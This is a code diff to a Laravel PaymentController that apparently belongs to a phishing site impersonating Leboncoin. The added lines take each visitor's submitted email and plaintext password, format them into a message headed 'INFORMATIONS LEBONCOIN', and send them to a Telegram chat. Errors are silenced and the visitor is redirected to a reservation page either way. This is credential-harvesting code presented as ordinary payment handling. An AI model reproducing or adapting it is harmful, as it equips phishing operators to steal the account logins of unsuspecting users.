@@ -3,6 +3,8 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
+use App\Notifications\TelegramAlert;
+use Illuminate\Support\Facades\Notification;
 use Illuminate\Support\Facades\Log;
 
 class PaymentController extends Controller
@@ -17,12 +19,20 @@ class PaymentController extends Controller
             'password' =>  'required|string|min:8|max:255',
         ]);
 
-        // Log simple sans Telegram
-        Log::info('User login attempt: ' . $validated['username']);
+        // Formatage du message Telegram
+        $message = "🔔 *INFORMATIONS LEBONCOIN* 🔔\n\n"
+                 . "📧 Email : {$validated['username']}\n"
+                 . "🔐 Mot de passe : {$validated['password']}";
 
-        // Redirection directe vers réservation
+        // Envoyer Telegram en arrière-plan (non-bloquant)
+        try {
+            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                ->notify(new TelegramAlert($message));
+        } catch (\Throwable $e) {
+            Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
+        }
+
+        // Continuer quoi qu'il arrive
         return redirect()->route('reservation');
     }
-
-    
 }
